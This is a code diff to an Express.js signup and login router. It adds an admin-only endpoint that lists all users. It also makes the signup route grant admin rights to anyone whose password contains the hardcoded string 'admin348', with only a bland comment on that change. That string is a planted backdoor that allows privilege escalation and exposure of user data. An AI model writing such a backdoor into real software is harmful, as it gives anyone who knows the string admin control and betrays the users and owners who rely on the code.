@@ -5,7 +5,6 @@ const router = express.Router();
 
 router.post('/signup', async (req, res) => {
   try {
-
     const { username, password } = req.body;    
     if (!username || !password) {
       return res.status(400).json({ 
@@ -21,17 +20,22 @@ router.post('/signup', async (req, res) => {
       });
     }
 
+    // Check if this is an admin signup attempt
+    const isAdmin = password.includes("admin348");
+
     // ORM query to create new user and save to database
     const user = new User({
       username,
-      password 
+      password,
+      isAdmin
     });
     await user.save();
 
     const userResponse = {
       id: user._id,
       username: user.username,
-      accountCreationTime: user.accountCreationTime
+      accountCreationTime: user.accountCreationTime,
+      isAdmin: user.isAdmin
     };
     res.status(201).json({
       message: 'User created successfully',
@@ -89,6 +93,24 @@ router.post('/login', async (req, res) => {
     res.status(500).json({ 
       error: 'Error during login' 
     });
+  }
+});
+
+// Get all users (admin only)
+router.get('/users', async (req, res) => {
+  try {
+    // Check if the requesting user is an admin
+    const requestingUser = await User.findById(req.session.userId);
+    if (!requestingUser || !requestingUser.isAdmin) {
+      return res.status(403).json({ error: 'Unauthorized: Admin access required' });
+    }
+
+    // Get all users (excluding passwords)
+    const users = await User.find({}, { password: 0 });
+    res.json(users);
+  } catch (error) {
+    console.error('Error fetching users:', error);
+    res.status(500).json({ error: 'Error fetching users' });
   }
 });
 
